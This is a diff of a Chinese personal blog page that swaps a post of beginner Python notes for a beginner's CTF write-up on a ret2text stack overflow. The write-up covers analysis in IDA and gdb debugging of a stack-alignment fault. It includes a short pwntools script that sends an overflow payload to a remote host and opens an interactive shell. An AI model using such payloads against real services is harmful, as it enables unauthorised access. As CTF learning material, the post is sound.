@@ -19,29 +19,34 @@
   <meta name="author" content="Nefelibata">
   <meta name="keywords" content="">
   
-    <meta name="description" content="1.打印 print每个print都默认另起一行 print(greet)直接打印greet的值 2.字符串连接””  + 单双引号转义””   ‘’   \ 换行\n 三引号跨行字符串’’’ ‘’’ 3.命名 下划线user_age  驼峰UserAge 4.字符串”6” 数字 6 浮点数：6.0 5.运算的先后顺序： （） **            2**3 ——2的3次方 *&#x2F;">
+    <meta name="description" content="ret2text 1.先托入ide中查看  2.拖入ida中： ![image-20241127192619944](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;azjzfyuan&#x2F;images&#x2F;202411271926129.png  1.分析函数： 确认buf距离栈底20个字节（h为16进制）     3.写脚本攻击服务器 先在本地运行，（因为本地可以调试） 1p &#x3D; proces">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Python语言基础">
-<meta property="og:url" content="http://example.com/2024/11/25/Python%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:title" content="pwn初体验">
+<meta property="og:url" content="http://example.com/2024/11/27/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/index.html">
 <meta property="og:site_name" content="星期六不上发条">
-<meta property="og:description" content="1.打印 print每个print都默认另起一行 print(greet)直接打印greet的值 2.字符串连接””  + 单双引号转义””   ‘’   \ 换行\n 三引号跨行字符串’’’ ‘’’ 3.命名 下划线user_age  驼峰UserAge 4.字符串”6” 数字 6 浮点数：6.0 5.运算的先后顺序： （） **            2**3 ——2的3次方 *&#x2F;">
+<meta property="og:description" content="ret2text 1.先托入ide中查看  2.拖入ida中： ![image-20241127192619944](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;azjzfyuan&#x2F;images&#x2F;202411271926129.png  1.分析函数： 确认buf距离栈底20个字节（h为16进制）     3.写脚本攻击服务器 先在本地运行，（因为本地可以调试） 1p &#x3D; proces">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251318762.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251318913.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251319227.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251319316.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251319263.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251319744.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251320579.png">
-<meta property="article:published_time" content="2024-11-25T05:15:38.000Z">
-<meta property="article:modified_time" content="2024-11-25T12:03:28.983Z">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272027539.png">
+<meta property="og:image" content="http://example.com/2024/11/27/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/Users/hp/AppData/Roaming/Typora/typora-user-images/image-20241127203614027.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411271931584.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272044812.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272054077.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272106106.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272107049.png">
+<meta property="og:image" content="http://example.com/2024/11/27/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/Users/hp/AppData/Roaming/Typora/typora-user-images/image-20241127213538953.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272139275.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272143470.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272146052.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272150785.png">
+<meta property="article:published_time" content="2024-11-27T11:21:32.000Z">
+<meta property="article:modified_time" content="2024-11-27T13:50:39.855Z">
 <meta property="article:author" content="Nefelibata">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251318762.png">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272027539.png">
   
   
   
-  <title>Python语言基础 - 星期六不上发条</title>
+  <title>pwn初体验 - 星期六不上发条</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -207,7 +212,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Python语言基础"></span>
+            <span id="subtitle" data-typed-text="pwn初体验"></span>
           
         </div>
 
@@ -218,8 +223,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-11-25 13:15" pubdate>
-          2024年11月25日 下午
+        <time datetime="2024-11-27 19:21" pubdate>
+          2024年11月27日 晚上
         </time>
       </span>
     
@@ -230,7 +235,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          910 字
+          246 字
         
       </span>
     
@@ -241,7 +246,7 @@
         
         
         
-          8 分钟
+          3 分钟
         
       </span>
     
@@ -278,158 +283,64 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Python语言基础</h1>
+            <h1 id="seo-header">pwn初体验</h1>
             
             
               <div class="markdown-body">
                 
-                <p>1.<strong>打印</strong></p>
-<p>print每个print都默认另起一行</p>
-<p>print(greet)直接打印greet的值</p>
-<p>2.字符串连接””  +</p>
-<p>单双引号转义””   ‘’   \</p>
-<p>换行\n</p>
-<p>三引号跨行字符串’’’ ‘’’</p>
-<p>3.<strong>命名</strong></p>
-<p>下划线user_age </p>
-<p>驼峰UserAge</p>
-<p>4.字符串”6”</p>
-<p>数字 6</p>
-<p>浮点数：6.0</p>
-<p>5.<strong>运算的先后顺序</strong>：</p>
-<p>（）</p>
-<p>**            2**3 ——2的3次方</p>
-<p>*&#x2F;</p>
-<p>+-</p>
-<p>6.<strong>math</strong>提供数学运算函数的库</p>
-<p>import math</p>
-<p>math.函数名（…）</p>
-<p>eg:math.sin(1)</p>
-<p>7**.注释**：</p>
-<p>整段：CTRL+&#x2F;或者’’’ ‘’’</p>
-<p>8.数据类型：int float bool str字符串 NoneType空值类型(表示完全没有值）</p>
-<p>str:”hello” ‘哟!’</p>
-<p>len(‘hello’)得到字符串的长度</p>
-<p>空格，数字，符号都会占据一个长度（转义字符占取一个长度）</p>
-<p>“world”[索引] 提取该位置的字符</p>
-<p>“world”[3]——&gt;l</p>
-<p>bool:真True 假False</p>
-<p>print（type（3））输出数据类型int</p>
-<p>9.<strong>交互模式</strong></p>
-<p>直接输出一行的结果</p>
-<p>不用创建文档，不用写print直接输出，命令不会保存。</p>
-<p>命令行模式</p>
-<p>退出时：键入quit()\n  python3或者CRTL d</p>
-<p>10.<strong>input函数</strong></p>
-<p>input(里面放字符串）给用户的给用户的提示信息</p>
-<p>intput自动返回字符串，所以运用用户输入的信息进行运算时用int，float，等等转换数据类型</p>
-<p>对了，str可以把其他类型转换成字符串</p>
-<p>因为整数不能和字符串连在一起打印，所以把整形转换成字符型</p>
-<p>user_age&#x3D;int(input(“请输入你的年龄：”）</p>
-<p>user_user_age_after_10_year&#x3D;user_age+10</p>
-<p>print(“您十年后会是”+str（user_user_age_after_10_year)+”岁”）</p>
-<p>11.<strong>if语句</strong></p>
-<p>age &#x3D; 18</p>
-<p> if age &gt;&#x3D; 18:</p>
-<p>​    print(“您已成年”)</p>
-<p>else:</p>
-<p>​    print(“哈哈，你还没成年）</p>
-<p>比较运算符：&#x3D;&#x3D;   !&#x3D;   &gt;   &gt;&#x3D;   &lt;   &lt;&#x3D;</p>
-<p>记得要加：</p>
-<p>执行语句要有缩进（建议是4个空格）</p>
-<p>嵌套函数</p>
-<p>多个条件判断：elif</p>
-<p>if条件：</p>
-<p>—-语句</p>
-<p>elif条件：</p>
-<p>—-语句</p>
-<p>elif条件：</p>
-<p>—-语句</p>
-<p>else：</p>
-<p>—-语句</p>
-<p>12.<strong>逻辑运算</strong></p>
-<p>not &gt;and &gt;or</p>
-<p>13.<strong>列表</strong>（类似指针）</p>
-<p>其内部可以加不同种类的</p>
-<p>shopping_list&#x3D;[“键盘”,”键帽”]</p>
-<p>如果要加东西：</p>
-<p>shopping_list.append(“显示器”)</p>
-<p>删去：</p>
-<p>用remov</p>
-<p>修改：直接重新定义，覆盖</p>
-<p>因为列表可变，所以不要也不应该再给其赋值</p>
-<p>利用len函数求长度</p>
-<p>列表回返回元素的数量</p>
-<p>利用索引定位</p>
-<p>max，min，sorted排序好的返回</p>
-<p>14.<strong>字典</strong>，可变，</p>
-<p>键：值   key：value</p>
-<p>键的类型是不可变的（列表不是）</p>
-<p>contacts&#x3D;{“小明”：”13700000000”,”小花”:”13700000001”}</p>
-<p>contact[‘’小明’’]</p>
-<p>①元组，存入相同值，不可变</p>
-<p>添加，删除元组不能操作</p>
-<p>contacts&#x3D;{(“小明”,23)：”13700000000”,(“小明”,34):”13700000001”}</p>
-<p>②字典添加：</p>
-<p>contacts[“美女A”]&#x3D;”18600000000”</p>
-<p>如果其键已经存在，则重新赋值为覆盖。</p>
-<p>要想知道该建是的存在：键 in contacts</p>
-<p>print（”小明”in contacts）</p>
-<p>存在返回True不存在返回False</p>
-<p>③删除一个键值对：</p>
-<p>del contacts [“小明”]</p>
-<p>④想知道有多少键值对：</p>
-<p>len（comtacts）</p>
-<p>⑤字典：</p>
-<p>字典名.keys所有键</p>
-<p>字典名.values所有值</p>
-<p>字典名.items所有键值对</p>
-<p>15.<strong>for循环</strong></p>
-<p>for 变量名 in 迭代对象：</p>
-<p>​    if temp&gt;&#x3D;38:</p>
-<p>​        print (temp)</p>
-<p><strong>整数数列</strong></p>
-<p>rang（开始值，结束值，步长）五步长时默认为1</p>
-<p>结束值不包含</p>
-<p>rang（5，10）</p>
-<p>rang（5）</p>
-<p>起始值默认为0，</p>
-<p>打印1-9的所有奇数</p>
-<p>for num in range (1,10,2)</p>
-<p>​    print (num)</p>
-<p>计算1-100</p>
-<p>total&#x3D;0</p>
-<p>for i in range (1,101):</p>
-<p>​    total&#x3D;total+i</p>
-<p>print (total)</p>
-<p>16.while循环</p>
-<p>while 条件A：</p>
-<p>​    行动B</p>
-<p>17.格式化字符串</p>
-<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251318762.png" srcset="/img/loading.gif" lazyload alt="image-20241125131838580"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251318913.png" srcset="/img/loading.gif" lazyload alt="image-20241125131856736"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251319227.png" srcset="/img/loading.gif" lazyload alt="image-20241125131910092"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251319316.png" srcset="/img/loading.gif" lazyload alt="image-20241125131932180"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251319263.png" srcset="/img/loading.gif" lazyload alt="image-20241125131948139"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251319744.png" srcset="/img/loading.gif" lazyload alt="image-20241125131955619"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411251320579.png" srcset="/img/loading.gif" lazyload alt="image-20241125132014443"></p>
-<p>18.<strong>函数</strong>，定义参数</p>
-<p>del 函数名 （参数，参数）：</p>
-<p>​    #定义函数的代码</p>
-<p>​    #…</p>
-<p>​    return</p>
-<p>调用时：</p>
-<p>函数名（实参，实参）</p>
-<p>19.<strong>引入模块</strong></p>
-<p>因为内置函数有限，因此为了方便计算，可以引入其他标准库</p>
-<p>①import模块</p>
-<p>模块名.变量名</p>
-<p>模块名.函数名</p>
-<p>②from 模块名 import 函数或变量</p>
-<p>③form 模块名import *</p>
-<p>第三方</p>
-<p>20.<strong>OOP</strong></p>
-<p>面向对象编程</p>
+                <p><strong>ret2text</strong></p>
+<p>1.先托入ide中查看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272027539.png" srcset="/img/loading.gif" lazyload alt="image-20241127202727338"></p>
+<p>2.拖入ida中：</p>
+<p>![image-20241127192619944](<a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411271926129.png">https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411271926129.png</a></p>
+<p><img src="/2024/11/27/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/Users\hp\AppData\Roaming\Typora\typora-user-images\image-20241127203614027.png" srcset="/img/loading.gif" lazyload alt="image-20241127203614027"></p>
+<p>1.分析函数：</p>
+<p>确认buf距离栈底20个字节（h为16进制）</p>
+<ol start="2">
+<li></li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411271931584.png" srcset="/img/loading.gif" lazyload alt="image-20241127193117448"></p>
+<p>3.写脚本攻击服务器</p>
+<p>先在本地运行，（因为本地可以调试）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p = process(<span class="hljs-string">&quot;./文件名&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>（文件名大小写没关系）</p>
+<p>payload:</p>
+<p>①距离为 0x20</p>
+<p>②地址要加 0x！！！！！</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;222.22.91.49&quot;</span>,<span class="hljs-string">&quot;32783&quot;</span>)<br><span class="hljs-comment"># gdb.attach(p,&#x27;b*0x00000000004011A2&#x27;)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span> +p64(<span class="hljs-number">0x00000000004011A9</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<p>3：本题涉及栈平衡，因此这个地址不正确</p>
+<p>刚开始写的：(有两处错误)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272044812.png" srcset="/img/loading.gif" lazyload alt="image-20241127204433735"></p>
+<p>开始写：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272054077.png" srcset="/img/loading.gif" lazyload alt="image-20241127205438921"></p>
+<p>接着写payload:</p>
+<p>发现失败了：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272106106.png" srcset="/img/loading.gif" lazyload alt="image-20241127210607968"></p>
+<p>开始调试：</p>
+<p>添加：</p>
+<p>leave</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">gdb<span class="hljs-selector-class">.attach</span>(<span class="hljs-selector-tag">p</span>,<span class="hljs-string">&#x27;b*0x00000000004011A2&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272107049.png" srcset="/img/loading.gif" lazyload alt="image-20241127210748905"></p>
+<p>运行：</p>
+<p>这个时候在pwning文件里面打开终端</p>
+<p>输入t（进入分屏）（CTRL＋d)</p>
+<p><img src="/2024/11/27/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/Users\hp\AppData\Roaming\Typora\typora-user-images\image-20241127213538953.png" srcset="/img/loading.gif" lazyload alt="image-20241127213538953"></p>
+<p>输入c&#x2F;ni</p>
+<p>发现卡住了：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272139275.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个时候发现movaps栈不平衡,</p>
+<p>回到IDA找到</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272143470.png" srcset="/img/loading.gif" lazyload alt="image-20241127214303408"></p>
+<p>改地址：00000000004011A9</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272146052.png" srcset="/img/loading.gif" lazyload alt="image-20241127214607982"></p>
+<p>改一下，运行，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272150785.png" srcset="/img/loading.gif" lazyload alt="image-20241127215023656"></p>
+<p>改成远端就可以了</p>
 
                 
               </div>
@@ -447,8 +358,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Python语言基础</div>
-      <div>http://example.com/2024/11/25/Python语言基础/</div>
+      <div>pwn初体验</div>
+      <div>http://example.com/2024/11/27/pwn初体验/</div>
     </div>
     <div class="license-meta">
       
@@ -460,7 +371,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年11月25日</div>
+          <div>2024年11月27日</div>
         </div>
       
       
@@ -492,18 +403,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/11/27/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/" title="pwn初体验">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">pwn初体验</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/10/27/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" title="博客搭建">
-                        <span class="hidden-mobile">博客搭建</span>
+                      <a href="/2024/11/25/Python%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/" title="Python语言基础">
+                        <span class="hidden-mobile">Python语言基础</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
